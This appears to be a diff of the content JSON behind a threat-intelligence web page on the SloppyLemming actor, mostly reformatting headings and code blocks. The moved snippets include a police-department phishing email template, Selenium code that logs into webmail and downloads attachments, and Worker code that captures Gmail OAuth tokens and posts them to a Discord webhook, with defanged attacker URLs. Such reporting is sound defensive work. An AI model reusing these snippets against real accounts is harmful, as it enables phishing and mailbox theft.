@@ -38,21 +38,21 @@
 				"topNavButtonUrl": null,
 				"footerOptions": "default",
 				"metaTags": {
-					"metaTitle": "Unraveling SloppyLemming's Operations Across South Asia",
+					"metaTitle": "Unraveling SloppyLemming's operations across South Asia",
 					"metaDescription": "Cloudforce One has tracked a persistent, state-aligned actor targeting regional governments, militaries, energy and technology organizations across South and East Asia.",
 					"twitterCustomImage": null,
 					"metaImage": {
 						"file": {
-							"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/53qCYhQbir5WtIU0VDWESo/954a48bfb17f429acf469e5f14345d83/unnamed-3.png"
+							"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/5mJwiC9wFNQORruuROSnNG/acc69b9eb918df00540a27c555c023c6/Cloudforce-One-clean-meta.png"
 						},
-						"description": "DO NOT REMOVE, THIS IS CLOUDFLARE'S GLOBAL OG META ASSET"
+						"description": "Cloudforce One - Meta image"
 					},
 					"facebookCustomImage": null,
 					"author": []
 				},
 				"sys": {
 					"createdAt": "2024-09-24T12:10:12.102Z",
-					"updatedAt": "2024-09-24T12:10:12.102Z"
+					"updatedAt": "2024-09-27T04:45:37.058Z"
 				},
 				"contentfulId": "1F7yyC2hDESdDrMjdFNLZc",
 				"contentTypeId": "page",
@@ -382,11 +382,11 @@
 					{
 						"contentfulId": "3PrKEqV0KR1GL58MwNAjUl",
 						"contentTypeId": "bladeHeroAnimation",
-						"title": "Unraveling SloppyLemming's Operations Across South Asia",
+						"title": "Unraveling SloppyLemming's operations across South Asia",
 						"titleSize": "large",
 						"subtitle": null,
 						"subtitleSize": "medium",
-						"copy": "Threat brief • September 24, 2024",
+						"copy": "Threat brief - September 24, 2024",
 						"buttonColor": "orange",
 						"buttonColor2": "orange",
 						"buttonText1": null,
@@ -451,7 +451,7 @@
 						"backgroundColor": "white",
 						"bladeBorder": "none",
 						"sectionPadding": null,
-						"columnLayout": "One Third & Two Thirds",
+						"columnLayout": "Left Sidebar",
 						"columns": [
 							{
 								"contentTypeId": "elementRichText",
@@ -502,7 +502,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Summary & Background\n\nAnalysis & Mitigation\n\nTimeline & Response\n\nRecommendations",
+													"value": "Executive summary\n\nWho is SloppyLemming?\n\nSloppyLemming phishing activity focuses on credential, token collection\n\nMalware operations\n\nAdditional C2 infrastructure and traffic analysis\n\nSloppyLemming targeting and victimology\n\nMitigating SloppyLemming activity\n\nCloudflare product detections\n\nIndicators of compromise",
 													"marks": [],
 													"content": null
 												}
@@ -669,7 +669,7 @@
 								"contentTypeId": "elementRichText",
 								"contentfulId": "4dJxsRin4KToxqpbU4Kn20",
 								"title": null,
-								"htmlId": null,
+								"htmlId": "report1-content-element",
 								"elementPosition": "relative",
 								"column": {
 									"nodeType": "document",
@@ -710,7 +710,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Executive Summary",
+													"value": "Executive summary",
 													"marks": [],
 													"content": null
 												}
@@ -824,7 +824,28 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "paragraph",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -959,7 +980,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "paragraph",
 											"data": {
 												"target": null,
 												"uri": null
@@ -973,7 +994,28 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Phishing Activity Focuses on Credential, Token Collection",
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "heading-3",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "SloppyLemming phishing activity focuses on credential, token collection",
 													"marks": [],
 													"content": null
 												}
@@ -1001,6 +1043,27 @@
 											]
 										},
 										{
+											"nodeType": "paragraph",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
 											"nodeType": "heading-3",
 											"data": {
 												"target": null,
@@ -1015,7 +1078,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Credential Harvesting Overview",
+													"value": "SloppyLemming credential harvesting overview",
 													"marks": [],
 													"content": null
 												}
@@ -1060,180 +1123,49 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "48KnPGeSQkTKog6G63nFdH",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "48KnPGeSQkTKog6G63nFdH",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 1",
+																	"markdown": "    Dear [Officer's Name],\n\n    As part of our ongoing efforts to enhance the security of our internal systems, we are rolling out a mandatory update to our secure access protocols. All personnel are required to complete this update within the next 24 hours to ensure continued access to department resources.\n\n    Please log in to the police department's IT portal using the link below to initiate the update process:\n\n    [Fake IT Portal Link]\n\n    Failure to complete this update will result in the temporary suspension of your account access.\n\n    Thank you for your cooperation.\n\n    Best regards,\n    IT Department\n    [Police Department's Name]"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
 														"target": null,
 														"uri": null
 													},
-													"value": "Dear [Officer's Name],",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "As part of our ongoing efforts to enhance the security of our internal systems, we are rolling out a mandatory update to our secure access protocols. All personnel are required to complete this update within the next 24 hours to ensure continued access to department resources.",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Please log in to the police department's IT portal using the link below to initiate the update process:",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "[Fake IT Portal Link]",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Failure to complete this update will result in the temporary suspension of your account access.",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Thank you for your cooperation.",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Best regards,\nIT Department\n[Police Department's Name]",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
+													"value": "",
+													"marks": [],
 													"content": null
 												}
 											]
@@ -1723,37 +1655,43 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "\n",
+													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
+														"target": {
+															"sys": {
+																"id": "3WzQ4puhN7jzJ7Nqnqt3H2",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "3WzQ4puhN7jzJ7Nqnqt3H2",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 2",
+																	"markdown": "\n    # Enter password\n\n    password_input =  driver.find_element(By.ID, \"password\")\n    password_input.send_keys(password)\n\n    # Click the login button\n    password_input.send_keys(Keys.RETURN)\n\n    ...\n\n    # Navigate to the Inbox\n    inbox_link = driver.find_element(By.CSS_SELECTOR,\n    'a[href=\"#zv__main_page__main_Mail\"]')\n\n    inbox_link.click()\n\n    ...\n\n    # Iterate through each email in the inbox\n    emails = driver.find_elements(By.CSS_SELECTOR, 'div[class=\"zA zE\"]')\n\n    for email in emails:\n\n        # Click on the email\n        email.click()\n\n    ...\n\n        # Search for attachments and click on download links\n        attachments = driver.find_elements(By.CSS_SELECTOR,\n    'a.AttLink[id^=\"zv__CLV__main_MSGC\"][title=\"Download\"]')\n\n       for attachment in attachments:\n            attachment.click()\n\n    ...\n\n        # Go back to the Inbox\n        driver.execute_script(\"window.history.go(-1)\")\n\n    ...\n\n    # Get the subject of the first email\n\n    first_email_subject = driver.find_element_by_css_selector('.zA span.bqe').text\n\n    print(\"Subject of the first email:\", first_email_subject)\n\n    ...\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
 														"uri": null
 													},
-													"value": "Python\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
+													"value": null,
+													"marks": null,
+													"content": []
 												},
 												{
 													"nodeType": "text",
@@ -1761,512 +1699,8 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "# Enter password\npassword_input =  driver.find_element(By.ID, \"password\")\npassword_input.send_keys(password)",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "# Click the login button\npassword_input.send_keys(Keys.RETURN)",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "# Navigate to the Inbox\ninbox_link = driver.find_element(By.CSS_SELECTOR, 'a[href=\"#zv__main_page__main_Mail\"]')",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "inbox_link.click()",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "# Iterate through each email in the inbox\nemails = driver.find_elements(By.CSS_SELECTOR, 'div[class=\"zA zE\"]')",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "for email in emails:",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    # Click on the email\n    email.click()",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    # Search for attachments and click on download links\n    attachments = driver.find_elements(By.CSS_SELECTOR, 'a.AttLink[id^=\"zv__CLV__main_MSGC\"][title=\"Download\"]')",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "   for attachment in attachments:",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        attachment.click()",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    # Go back to the Inbox\n    driver.execute_script(\"window.history.go(-1)\")",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "# Get the subject of the first email",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "first_email_subject = driver.find_element_by_css_selector('.zA span.bqe').text",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "print(\"Subject of the first email:\", first_email_subject)",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
 													"value": "",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
+													"marks": [],
 													"content": null
 												}
 											]
@@ -2388,7 +1822,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Google OAuth Token Collection",
+													"value": "SloppyLemming Google OAuth token collection",
 													"marks": [],
 													"content": null
 												}
@@ -2433,161 +1867,41 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
 												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
+														"target": {
+															"sys": {
+																"id": "26SQVry40cPNysBw4rGHtu",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "26SQVry40cPNysBw4rGHtu",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 3",
+																	"markdown": "    ...\n\n    // Serve the initial HTML page with iframe\n\n     const pdfUrl = 'https[:]//filebox-1-y7125191.deta[.]app/embed/bd9c25278a2639c0'; // Replace with the actual PDF URL\n\n    ..."
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
 														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
 												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "\n // Serve the initial HTML page with iframe",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": " const pdfUrl = 'https[:]//filebox-1-y7125191.deta[.]app/embed/bd9c25278a2639c0'; // Replace with the actual PDF URL",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
 												{
 													"nodeType": "text",
 													"data": {
@@ -2615,7 +1929,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "After the PDF loads, the user is then redirected to another malicious Worker at the URL https[:]//zoom.osutuga7.workers[.]dev/authenticate, where the server-side code (portions of which are provided below) attempts to reconstruct the user's Gmail OAuth token to transmit back to the adversary. Similar to how the actor sends credentials via Discord, the OAuth token is also delivered to the actor over Discord.",
+													"value": "After the PDF loads, the user is then redirected to another malicious Worker at the URL https[:]//zoom.osutuga7.workers[.]dev/authenticate, \nwhere the server-side code (portions of which are provided below) attempts \nto reconstruct the user's Gmail OAuth token to transmit back to the adversary. Similar to how the actor sends credentials via Discord, the OAuth token is also delivered to the actor over Discord.",
 													"marks": [],
 													"content": null
 												}
@@ -2630,6 +1944,50 @@
 											"value": null,
 											"marks": null,
 											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "6Lyza5om3Kc7xP3iuQoqBn",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "6Lyza5om3Kc7xP3iuQoqBn",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 4",
+																	"markdown": "\n    const DISCORD_WEBHOOK_URL = [Redacted];\n\n    const CLIENT_ID = [Redacted];\n\n    const CLIENT_SECRET = [Redacted];\n\n    const REDIRECT_URI = 'https[:]//storage.sharepoint-e13.workers[.]dev/oauth2callback';\n\n    const SCOPES = 'https://mail.google[.]com/';\n\n    ...\n\n    function handleAuthenticate() {\n     const authUrl = new URL('https://accounts.google[.]com/o/oauth2/v2/auth');\n     authUrl.searchParams.set('client_id', CLIENT_ID);\n     authUrl.searchParams.set('redirect_uri', REDIRECT_URI);\n     authUrl.searchParams.set('response_type', 'code');\n     authUrl.searchParams.set('scope', SCOPES);\n     authUrl.searchParams.set('access_type', 'offline');\n     authUrl.searchParams.set('prompt', 'consent');\n     return Response.redirect(authUrl.toString(), 302);\n    }\n\n    ...\n\n     const tokenData = await tokenResponse.json();\n     await sendToDiscord(tokenData);\n     const pdfUrl = 'https://filebox-1-y7125191.deta[.]app/embed/e2570171795675b4';\n     return Response.redirect(pdfUrl, 302);\n    }\n\n    async function sendToDiscord(tokenData,userinfo) {\n     const data = {\n       content: `Captured OAuth Token:\\n\\`\\`\\`json\\n${JSON.stringify(tokenData, null, 2)}\\n\\`\\`\\``\n     };\n\n    ..."
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -2657,329 +2015,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const DISCORD_WEBHOOK_URL = [Redacted];",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const CLIENT_ID = [Redacted];",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const CLIENT_SECRET = [Redacted];",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const REDIRECT_URI = 'https[:]//storage.sharepoint-e13.workers[.]dev/oauth2callback';",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const SCOPES = 'https://mail.google[.]com/';",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "function handleAuthenticate() {\n const authUrl = new URL('https://accounts.google[.]com/o/oauth2/v2/auth');\n authUrl.searchParams.set('client_id', CLIENT_ID);\n authUrl.searchParams.set('redirect_uri', REDIRECT_URI);\n authUrl.searchParams.set('response_type', 'code');\n authUrl.searchParams.set('scope', SCOPES);\n authUrl.searchParams.set('access_type', 'offline');\n authUrl.searchParams.set('prompt', 'consent');\n return Response.redirect(authUrl.toString(), 302);\n}",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
